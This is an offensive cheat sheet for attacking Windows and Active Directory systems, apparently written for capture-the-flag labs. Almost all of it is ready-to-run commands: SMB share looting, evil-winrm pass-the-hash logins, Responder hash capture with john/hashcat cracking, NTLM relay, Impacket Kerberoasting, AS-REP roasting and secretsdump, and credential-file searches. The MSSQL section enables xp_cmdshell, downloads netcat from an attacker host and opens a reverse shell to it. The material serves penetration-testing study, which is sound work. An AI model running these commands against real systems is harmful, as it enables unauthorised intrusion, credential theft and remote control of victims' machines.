# WINDOWS / AD TOOLING COMPLETE CHEAT SHEET

## 1. WHAT IS THIS?

Tools for **enumerating, connecting to, and exploiting Windows/AD environments**. Covers:

- **SMB** (smbclient, shares, uploads)
- **WinRM** (evil-winrm shell)
- **Responder** (credential capture)
- **Impacket** (suite of AD tools)
- **WinPEAS** (enumeration)
- **MSSQL** (xp_cmdshell)

**Key fact:** 80% of Windows pivoting uses these six tools.

---

## 2. SMBCLIENT — SMB FILE SHARING

### 2.1 List Shares

```bash
smbclient -L //<HOST> -U <USER>
smbclient -L //192.168.1.10 -U administrador
smbclient -L //192.168.1.10 -U 'usuario%password'
smbclient -L //192.168.1.10 -N              # anonymous
smbclient -N \\\\10.129.95.187\\backups
```

### 2.2 Connect to a Share

```bash
smbclient //<HOST>/<SHARE> -U <USER>
smbclient //192.168.1.10/shared -U 'juan%Secreto123'
smbclient //<HOST>/<SHARE> -N                # anonymous
smbclient //host/share -m SMB3                # force SMB3
smbclient //host/share -U usuario -W DOMINIO  # domain
smbclient //host/share -I <IP>                # IP fallback
smbclient //host/share -p <port>              # custom port
```

### 2.3 One-liner Commands

```bash
smbclient //host/share -U 'user%pass' -c "ls; get secret.txt; exit"
```

### 2.4 Inside the Session

```
ls / dir             # list files
cd <dir>             # change remote dir
lcd <localdir>       # change local dir
get <remote> [local] # download file
mget <pattern>       # download multiple
put <local> [remote] # upload file
mput <pattern>       # upload multiple
mkdir / rmdir        # create/delete dir
del <file>           # delete file
recurse              # toggle recursion for mget/mput
prompt               # toggle confirmation
stat                 # info
exit / quit          # exit
```

### 2.5 Examples

```bash
smbclient //10.0.0.5/docs -U 'demo%1234' -c "get report.pdf"
smbclient //10.0.0.5/backups -U 'user%pass' -c "recurse; mget *"
smbclient //10.0.0.5/uploads -U 'user%pass' -c "put localfile.txt remoto.txt"
```

### 2.6 Mount SMB Locally

```bash
sudo mount.cifs //HOST/SHARE /mnt/point -o user=usuario,pass=contraseña,vers=3.0
```

---

## 3. EVIL-WINRM — WINDOWS REMOTE SHELL

### 3.1 Basic Connection

```bash
evil-winrm -i <IP> -u <USER> -p <PASS>
evil-winrm -i 10.129.100.126 -u Administrator -p Sup3rSecr3t!
evil-winrm -i <IP> -u <USER> -p <PASS> -s      # SSL (port 5986)
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>    # Pass-the-Hash
evil-winrm --help
```

### 3.2 Interactive Commands

```
help                     # internal help
shell                    # cmd.exe
powershell               # PowerShell
download <rem> <loc>     # download file
upload <loc> <rem>       # upload file
ls <path> / cat <file>   # list / read
getuid / whoami          # current user
getprivs                 # token privileges
```

### 3.3 Enumeration After Login

```cmd
whoami
whoami /groups
net user %USERNAME%
net user
net localgroup administrators
systeminfo
ipconfig /all
tasklist /v
```

```powershell
Get-ChildItem -Path C:\ -Include pass,cred,web.config -Recurse -ErrorAction SilentlyContinue
```

### 3.4 Troubleshooting

```bash
# Verify WS-Man responds
curl --ntlm -u 'USER:PASS' http://IP:5985/wsman
```

---

## 4. RESPONDER — NTLM CAPTURE

### 4.1 What It Does

Responder spoofs **LLMNR / NBT-NS / mDNS** responses to capture NTLM/NTLMv2 hashes when hosts try to resolve non-existent names.

### 4.2 Run

```bash
sudo responder -I <interface>
sudo responder -I eth0
sudo responder -I eth0 -W           # enable WPAD
sudo responder -I eth0 -v           # verbose
responder -h
```

### 4.3 Logs

```
./logs/
/usr/share/responder/logs/
/opt/Responder/logs/
```

```bash
sudo ls -lah /usr/share/responder/logs
sudo cat /usr/share/responder/logs/*
grep -i ntlmv2 /usr/share/responder/logs/*
```

### 4.4 Crack Captured Hashes

```bash
gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
john --format=netntlmv2 --wordlist=/tmp/rockyou.txt hashes.txt
hashcat -m 5600 hashes.txt /tmp/rockyou.txt
```

### 4.5 NTLM Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 5. IMPACKET — AD ATTACK SUITE

Repository: https://github.com/fortra/impacket

Key tools:

```bash
# AS-REP Roasting
impacket-GetNPUsers domain/ -dc-ip <IP> -no-pass
impacket-GetNPUsers domain/ -dc-ip <IP> -usersfile users.txt -format hashcat -o asrep.hashes

# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip <IP> -request
impacket-GetUserSPNs domain/user:pass -dc-ip <IP> -outputfile kerberoast.hashes

# PsExec / WMIExec / SMBExec
impacket-psexec domain/user@<IP> -hashes <LM:NT>
impacket-wmiexec domain/user@<IP> -hashes <LM:NT>
impacket-smbexec domain/user@<IP>

# Secretsdump
impacket-secretsdump domain/user@<IP>
```

---

## 6. WINPEAS — WINDOWS ENUMERATION

```powershell
# Download
powershell wget http://10.10.14.62/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe
```

Or from **PEASS-ng**:
```
https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
```

---

## 7. MSSQL — XP_CMDSHELL

Remote command execution via SQL Server.

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Download tools
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.62/nc64.exe -outfile nc64.exe"

-- Reverse shell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.62 443"

-- Read files
type user.txt

-- Look for PSReadLine history
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
```
